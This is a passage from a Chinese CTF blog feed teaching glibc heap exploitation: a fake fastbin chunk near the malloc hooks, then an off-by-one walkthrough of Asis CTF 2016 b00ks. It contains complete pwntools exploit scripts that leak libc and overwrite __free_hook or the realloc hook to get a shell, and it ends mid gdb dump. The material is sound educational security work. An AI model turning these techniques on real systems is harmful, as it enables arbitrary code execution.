<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果我们要申请个chunk的话，应当如何，不伪造chunk可不可以，我尝试过，失败了，<br>我报了这个错<br><strong>malloc(): memory corruption (fast)</strong><br>经师傅提点，去查看malloc源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">   This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">   can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast())) &#123;</span><br><span class="line">    <span class="comment">// 得到对应的fastbin的下标</span></span><br><span class="line">    idx             = fastbin_index(nb);</span><br><span class="line">    <span class="comment">// 得到对应的fastbin的头指针</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">    mchunkptr    pp = *fb;</span><br><span class="line">    <span class="comment">// 利用fd遍历对应的bin内是否有空闲的chunk块，</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd,</span><br><span class="line">                                                        victim)) != victim);</span><br><span class="line">    <span class="comment">// 存在可以利用的chunk</span></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span></span><br><span class="line">        <span class="comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span></span><br><span class="line">        <span class="comment">// 利用fastbin_index 计算 chunk 的索引。</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">            errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">        errout:</span><br><span class="line">            malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 细致的检查。。只有在 DEBUG 的时候有用</span></span><br><span class="line">        check_remalloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="comment">// 将获取的到chunk转换为mem模式</span></span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">        <span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他会检测大小是否正确，所以不伪造chunk的size部分过不了关的<br>在回到这里</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/5gx 0x7f14d2670730-0x10</span><br><span class="line">0x7f14d2670720 &lt;__memalign_hook&gt;:	0x00007f14d2335c90	0x0000000000000000</span><br><span class="line">0x7f14d2670730 &lt;__realloc_hook&gt;:	0x00007f14d2335c30	0x0000000000000000</span><br><span class="line">0x7f14d2670740 &lt;__malloc_hook&gt;:	0x0000000000000000</span><br></pre></td></tr></table></figure><p>这样是个chunk的话，pre_size是0x00007f14d2335c90，size是0，这样肯定没法搞，所以我们要利用一点错位，让size成功变成fastbin里的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/5gx 0x7f14d2670730-0x10-0x3</span><br><span class="line">0x7f14d267071d:	0x14d2335c90000000	0x000000000000007f</span><br><span class="line">0x7f14d267072d:	0x14d2335c30000000	0x000000000000007f</span><br><span class="line">0x7f14d267073d:	0x0000000000000000</span><br></pre></td></tr></table></figure><p>这样不就成了，size为0x7f，然后我们现在大小对了，位置错位了，所以最后我们要补个’a’*0x3来填充我们的错位部分，然后在realloc部分填上我们的system地址，最后在调用一次getshell</p><p>这里的错位需要自己调试，不一定是跟我一样的错位，在fastbin attack部分也将会学习到</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system_addr = libc_base+system_off</span><br><span class="line">print(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x3</span></span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p8(<span class="number">0</span>)*(<span class="number">0x4d</span>+<span class="number">0x8</span>)</span><br><span class="line">PUT(<span class="string">"e"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line">payload = <span class="string">"/bin/sh"</span></span><br><span class="line">payload += p8(<span class="number">0</span>)*<span class="number">0x12</span> </span><br><span class="line">GET(payload)</span><br></pre></td></tr></table></figure><p>到了结尾了，这里有个点说明下，我们malloc(0x7f)跟伪造chunk的size是完全不一样的，我们malloc过后还要经过计算才得到size，你看普通malloc(0x7f)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x557c81b53130:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x557c81b53140:	0x0000557c81b53070	0x000000000000007f</span><br><span class="line">0x557c81b53150:	0x0000557c81b53180	0x0000557c81b53010</span><br><span class="line">0x557c81b53160:	0x0000557c81b53210	0x0000000000000000</span><br><span class="line">0x557c81b53170:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x557c81b53180:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b53190:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531a0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531b0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531c0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531d0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531e0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531f0:	0x4242424242424242	0x0042424242424242</span><br></pre></td></tr></table></figure><p>他获得的是0x91大小的chunk，具体size计算可以自己看源码，我只是点出这个点而已</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>这道题知识点较多，利用较复杂，利用堆块重叠泄露，在用fastbin attack</li><li>错位伪造chunk知识点，补上了，第一次遇到</li><li>这道题需要对堆的分配机制较为熟练才比较好做，像我调试了很久，最终才的出来的结论</li><li>遇到错误要学会去查看源码，好几个师傅都叫我看源码，最后才懂的</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNDY5NjYuaHRt" title="https://bbs.pediy.com/thread-246966.htm">看雪的师傅的文章<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L2dsaWJjLWhlYXAvb2ZmX2J5X29uZS16aC8=" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/">ctf-wiki原理介绍<i class="fa fa-external-link"></i></span></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/83154af0/">https://noone-hub.github.io/posts/83154af0/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程1</title>
    <url>/posts/1a1c1b4a/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程1"><a href="#pwn堆入门系列教程1" class="headerlink" title="pwn堆入门系列教程1"></a>pwn堆入门系列教程1</h1><p>本文首发于先知社区</p><p>因为自己学堆的时候，找不到一个系统的教程，我将会按照ctf-wiki的目录一步步学下去，尽量做到每天有更新，方便跟我一样刚入门堆的人学习，第一篇教程研究了4天吧，途中没人指导。。很尴尬，自己一个很容易的点研究了很久才懂，把踩过的坑也总结下，方便后人不再踩坑</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNTc0OQ==" title="https://xz.aliyun.com/t/5749">具体搭建方法点我<i class="fa fa-external-link"></i></span></p><h2 id="off-by-one原理（引用ctf-wiki"><a href="#off-by-one原理（引用ctf-wiki" class="headerlink" title="off by one原理（引用ctf-wiki)"></a>off by one原理（引用ctf-wiki)</h2><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><p>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。<br>字符串操作不合适<br>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。 此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上（heap based） 的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p><h2 id="off-by-one-利用思路（引用ctf-wiki"><a href="#off-by-one-利用思路（引用ctf-wiki" class="headerlink" title="off-by-one 利用思路（引用ctf-wiki)"></a>off-by-one 利用思路（引用ctf-wiki)</h2><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法<br>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等。</p><h2 id="off-by-one-自己理解"><a href="#off-by-one-自己理解" class="headerlink" title="off by one 自己理解"></a>off by one 自己理解</h2><p>其实就是程序员不小心，我们自己刚写代码的时候也是那样，经常会搞错，比如如下c代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">5</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    str[<span class="number">5</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码相信类似的，我们都写过，我们数组最高是<br>数组总长为5，数组下标从0开始，最大为4，而我们错误地使用了str[5],造成越界写了一个字节，这就是off-by-one，可这个开始我也没懂这个的强大，直到做了一道题目</p><h3 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h3><p>ctf-wiki上用了两种方法解这道题，我也就照着他的exp，一步步调试，没注释就慢慢理解，搞定了，他有纯利用off-by-one的，也有同时利用unlink跟off-by-one的，下面对这两种方法进行解释</p><p>先指出ida解析错误部分</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 )</span><br><span class="line">&#123;</span><br><span class="line">    *(v3 + <span class="number">6</span>) = v1;</span><br><span class="line">    *(off_202010 + v2) = v3;</span><br><span class="line">    *(v3 + <span class="number">2</span>) = v5;</span><br><span class="line">    *(v3 + <span class="number">1</span>) = ptr;</span><br><span class="line">    *v3 = ++unk_202024;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个v3加6是错误的偏移，应该是v3+3，具体看汇编代码就可以了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">text:<span class="number">0000000000001122</span> ; <span class="number">48</span>:                   *(v3 + <span class="number">6</span>) = v1;</span><br><span class="line">.text:<span class="number">0000000000001122</span></span><br><span class="line">.text:<span class="number">0000000000001122</span> loc_1122:                               ; CODE XREF: Create+<span class="number">1B</span>8↑j</span><br><span class="line">.text:<span class="number">0000000000001122</span>                 mov     eax, [rbp+var_20]</span><br><span class="line">.text:<span class="number">0000000000001125</span>                 mov     edx, eax</span><br><span class="line">.text:<span class="number">0000000000001127</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000112B</span>                 mov     [rax+<span class="number">18</span>h], edx</span><br><span class="line">.text:<span class="number">000000000000112</span>E ; <span class="number">49</span>:                   *(off_202010 + v2) = v3;</span><br><span class="line">.text:<span class="number">000000000000112</span>E                 lea     rax, off_202010</span><br><span class="line">.text:<span class="number">0000000000001135</span>                 mov     rax, [rax]</span><br><span class="line">.text:<span class="number">0000000000001138</span>                 mov     edx, [rbp+var_1C]</span><br><span class="line">.text:<span class="number">000000000000113B</span>                 movsxd  rdx, edx</span><br><span class="line">.text:<span class="number">000000000000113</span>E                 shl     rdx, <span class="number">3</span></span><br><span class="line">.text:<span class="number">0000000000001142</span>                 add     rdx, rax</span><br><span class="line">.text:<span class="number">0000000000001145</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">0000000000001149</span>                 mov     [rdx], rax</span><br><span class="line">.text:<span class="number">000000000000114</span>C ; <span class="number">50</span>:                   *(v3 + <span class="number">2</span>) = v5;</span><br><span class="line">.text:<span class="number">000000000000114</span>C                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">0000000000001150</span>                 mov     rdx, [rbp+var_8]</span><br><span class="line">.text:<span class="number">0000000000001154</span>                 mov     [rax+<span class="number">10</span>h], rdx</span><br><span class="line">.text:<span class="number">0000000000001158</span> ; <span class="number">51</span>:                   *(v3 + <span class="number">1</span>) = ptr;</span><br><span class="line">.text:<span class="number">0000000000001158</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000115</span>C                 mov     rdx, [rbp+ptr]</span><br><span class="line">.text:<span class="number">0000000000001160</span>                 mov     [rax+<span class="number">8</span>], rdx</span><br><span class="line">.text:<span class="number">0000000000001164</span> ; <span class="number">52</span>:                   *v3 = ++unk_202024;</span><br><span class="line">.text:<span class="number">0000000000001164</span>                 lea     rax, unk_202024</span><br><span class="line">.text:<span class="number">000000000000116B</span>                 mov     eax, [rax]</span><br><span class="line">.text:<span class="number">000000000000116</span>D                 lea     edx, [rax+<span class="number">1</span>]</span><br><span class="line">.text:<span class="number">0000000000001170</span>                 lea     rax, unk_202024</span><br><span class="line">.text:<span class="number">0000000000001177</span>                 mov     [rax], edx</span><br><span class="line">.text:<span class="number">0000000000001179</span>                 lea     rax, unk_202024</span><br><span class="line">.text:<span class="number">0000000000001180</span>                 mov     edx, [rax]</span><br><span class="line">.text:<span class="number">0000000000001182</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">0000000000001186</span>                 mov     [rax], edx</span><br><span class="line">.text:<span class="number">0000000000001188</span>                 mov     eax, <span class="number">0</span></span><br></pre></td></tr></table></figure><p>看每段的mov语句，</p><ul><li>第一段是mov [rax+18h],edx对应v3+6?</li><li>第二段不看，加了变量</li><li>第三段是mov [rax+10h],rdx对应v3+2？</li></ul><h4 id="off-by-one-攻击过程"><a href="#off-by-one-攻击过程" class="headerlink" title="off-by-one 攻击过程"></a>off-by-one 攻击过程</h4><p>出现这个漏洞的函数在这</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_9F5</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>; <span class="comment">//危险部分</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他由于没考虑好边界条件，多写了一个0到末尾<br>书本结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">char</span> *description;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><p>我先说明下攻击过程，下面的讲解会围绕这个攻击过程来</p><ol><li>填充满author</li><li>创建堆块1，覆盖author结尾的\x00,这样我们输出的时候就可以泄露堆块1的地址</li><li>创建堆块2，为后续做准备，堆块2要申请得比较大，因为mmap申请出来的堆块地址与libc有固定的偏移</li><li>泄露堆块1地址，记为first_heap</li><li><strong>(关键点来了)</strong> 这时候的攻击思路是利用编辑author的时候多写了一个\x00字节，可以覆盖到堆块1的地址的最后一位，如果我们提前将堆块1的内容编辑好，按照上述的结构体布置好，name和description我们自己控制，伪造成一个书本的结构体，然后让覆盖过后的地址刚好是book1的description部分的话，我们相当于获得了一个任意地址读写的能力啊</li><li>后面就简单了，任意读取获得libc地址</li><li>任意写将__free_hook函数的地址改写成one_gadget地址</li></ol><p>tips:__free_hook若没有则不调用，若有将先于free函数调用</p><h5 id="先贴上exp，没有代码，没有调试就没有灵魂"><a href="#先贴上exp，没有代码，没有调试就没有灵魂" class="headerlink" title="先贴上exp，没有代码，没有调试就没有灵魂"></a>先贴上exp，没有代码，没有调试就没有灵魂</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">'b00ks'</span>)</span><br><span class="line"></span><br><span class="line">LIBC = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">'127.0.0.1'</span></span><br><span class="line">port = int(args.PORT <span class="keyword">or</span> <span class="number">1080</span>)</span><br><span class="line">ctx.binary = <span class="string">'b00ks'</span></span><br><span class="line">ctx.remote_libc = LIBC</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> ctx.debug_remote_libc == <span class="literal">False</span>:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ctx.remote_libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(book_size, book_name, desc_size, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(book_size))</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">if</span> len(book_name) == book_size:<span class="comment">#deal with overflow</span></span><br><span class="line">        io.send(book_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(book_name)</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(desc_size))</span><br><span class="line">    <span class="keyword">if</span> len(desc) == desc_size:</span><br><span class="line">        io.send(desc)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(desc))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printbook</span><span class="params">(id)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(id):</span><br><span class="line">        book_id = int(io.readline()[:<span class="number">-1</span>])</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_name = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_des = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_author = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">author_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">    create(<span class="number">48</span>, <span class="string">'1a'</span>, <span class="number">240</span>, <span class="string">'1b'</span>) <span class="comment">#1</span></span><br><span class="line">    create(<span class="number">0x21000</span>, <span class="string">'2a'</span>, <span class="number">0x21000</span>, <span class="string">'2b'</span>)<span class="comment">#2</span></span><br><span class="line">    book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">    first_heap = u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">'first_heap: 0x%x'</span> % first_heap)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    payload =  <span class="string">'a'</span>*<span class="number">0xa0</span> + p64(<span class="number">1</span>) + p64(first_heap + <span class="number">0x38</span>) + p64(first_heap + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    author_name(<span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">    book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">    book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    book2_des_addr = u64(book_des.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"book2 name addr: 0x%x"</span> % book2_name_addr)</span><br><span class="line">    io.success(<span class="string">"book2 des addr: 0x%x"</span> % book2_des_addr)</span><br><span class="line">    libc_base = book2_des_addr - <span class="number">0x5a8010</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    offset = <span class="number">0x45216</span> </span><br><span class="line">    offset = <span class="number">0x4526a</span> </span><br><span class="line">    <span class="comment">#offset = 0xf02a4 </span></span><br><span class="line">    <span class="comment">#offset = 0xf1147</span></span><br><span class="line">    one_gadget = libc_base + offset</span><br><span class="line">    io.success(<span class="string">"free_hook addr: 0x%x"</span> % free_hook)</span><br><span class="line">    io.success(<span class="string">"one_gadget addr: 0x%x"</span> % one_gadget)</span><br><span class="line">    payload = p64(free_hook)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    edit(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p>我只讲解exp函数内的内容，外面的那些只是为了方便堆块的申请，输出，删除什么的，堆题建议都写成函数，因为将会有大量重复动作</p><h5 id="填满author"><a href="#填满author" class="headerlink" title="填满author"></a>填满author</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br></pre></td></tr></table></figure><p>具体查找author位置可以跟我一样，find 字符串</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ find author</span><br><span class="line">Searching for 'author' in: None ranges</span><br><span class="line">Found <span class="number">8</span> results, display max <span class="number">8</span> items:</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bcd83e1</span> (<span class="string">"author name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bcd8401</span> (<span class="string">"author name: "</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bcd841c</span> (<span class="string">"author_name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed83e1</span> (<span class="string">"author name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed8401</span> (<span class="string">"author name: "</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed841c</span> (<span class="string">"author_name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed905a</span> --&gt; <span class="number">0xa160726f68747561</span> </span><br><span class="line">    [<span class="built_in">stack</span>] : <span class="number">0x7ffed60b6406</span> (<span class="string">"author name: "</span>)</span><br></pre></td></tr></table></figure><p>这是创建一个堆块过后的效果，第三行便是book1结构体地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">20</span>gx <span class="number">0x555b3bed905a</span><span class="number">-0x2</span><span class="number">-0x18</span></span><br><span class="line"><span class="number">0x555b3bed9040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555b3bed9050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x726f687475616161</span></span><br><span class="line"><span class="number">0x555b3bed9060</span>:	<span class="number">0x0000555b3bf8a160</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed9070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed9080</span>:	<span 